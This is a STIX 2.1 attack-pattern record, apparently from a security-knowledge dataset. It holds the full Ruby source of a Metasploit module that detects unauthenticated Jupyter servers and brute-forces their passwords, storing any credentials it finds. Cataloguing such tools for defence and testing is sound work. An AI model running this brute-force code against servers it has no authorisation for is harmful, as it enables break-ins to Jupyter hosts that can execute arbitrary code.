{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a68de94c-6b25-426c-b666-d2d6e689e1fa",
    "created": "2024-08-14T16:29:04.554113Z",
    "modified": "2024-08-14T16:29:04.554118Z",
    "name": "Jupyter Login Utility",
    "description": " This module checks if authentication is required on a Jupyter Lab or Notebook server. If it is, this module will bruteforce the password. Jupyter only requires a password to authenticate, usernames are not used. This module is compatible with versions 4.3.0 (released 2016-12-08) and newer. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/jupyter_login.rb",
            "external_id": "jupyter_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/credential_collection'\nrequire 'metasploit/framework/login_scanner/jupyter'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n\n  def initialize\n    super(\n      'Name' => 'Jupyter Login Utility',\n      'Description' => %q{\n        This module checks if authentication is required on a Jupyter Lab or Notebook server. If it is, this module will\n        bruteforce the password. Jupyter only requires a password to authenticate, usernames are not used. This module\n        is compatible with versions 4.3.0 (released 2016-12-08) and newer.\n      },\n      'Author' => [ 'Spencer McIntyre' ],\n      'License' => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, 'The path to the Jupyter application', '/' ]),\n        Opt::RPORT(8888)\n      ]\n    )\n\n    deregister_options(\n      'DB_ALL_CREDS', 'DB_ALL_USERS', 'DB_SKIP_EXISTING',\n      'HttpUsername', 'PASSWORD_SPRAY', 'STOP_ON_SUCCESS', 'USERNAME', 'USERPASS_FILE', 'USER_AS_PASS', 'USER_FILE'\n    )\n\n    register_autofilter_ports([ 80, 443, 8888 ])\n  end\n\n  def requires_password?(_ip)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'tree')\n    })\n\n    return false if res&.code == 200\n\n    destination = res.headers['Location'].split('?', 2)[0]\n    return true if destination.end_with?(normalize_uri(target_uri.path, 'login'))\n\n    fail_with(Failure::UnexpectedReply, 'The server responded with a redirect that did not match a known fingerprint')\n  end\n\n  def run_host(ip)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'api')\n    })\n    fail_with(Failure::Unreachable, 'Failed to fetch the Jupyter API version') if res.nil?\n\n    version = res&.get_json_document&.dig('version')\n    fail_with(Failure::UnexpectedReply, 'Failed to fetch the Jupyter API version') if version.nil?\n\n    vprint_status \"#{peer} - The server responded that it is running Jupyter version: #{version}\"\n\n    unless requires_password?(ip)\n      print_good \"#{peer} - No password is required.\"\n      report_vuln(\n        host: ip,\n        port: rport,\n        proto: 'tcp',\n        sname: (ssl ? 'https' : 'http'),\n        name: 'Unauthenticated Jupyter Access',\n        info: \"Module #{fullname} confirmed unauthenticated access to the Jupyter application\"\n      )\n      return\n    end\n\n    cred_collection = Metasploit::Framework::PrivateCredentialCollection.new(\n      blank_passwords: datastore['BLANK_PASSWORDS'],\n      pass_file: datastore['PASS_FILE'],\n      password: datastore['PASSWORD']\n    )\n    cred_collection = prepend_db_passwords(cred_collection)\n\n    scanner = Metasploit::Framework::LoginScanner::Jupyter.new(\n      configure_http_login_scanner(\n        uri: normalize_uri(target_uri.path, 'login'),\n        cred_details: cred_collection,\n        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n        connection_timeout: 10,\n        http_password: datastore['HttpPassword'],\n        # there is only one password and no username, so don't bother continuing\n        stop_on_success: true\n      )\n    )\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n        module_fullname: fullname,\n        workspace_id: myworkspace_id\n      )\n      if result.success?\n        credential_core = create_credential(credential_data)\n        credential_data[:core] = credential_core\n        create_credential_login(credential_data)\n\n        print_good \"#{peer} - Login Successful: #{result.credential}\"\n      else\n        invalidate_login(credential_data)\n        vprint_error \"#{peer} - LOGIN FAILED: #{result.credential} (#{result.status})\"\n      end\n    end\n  end\nend\n"
}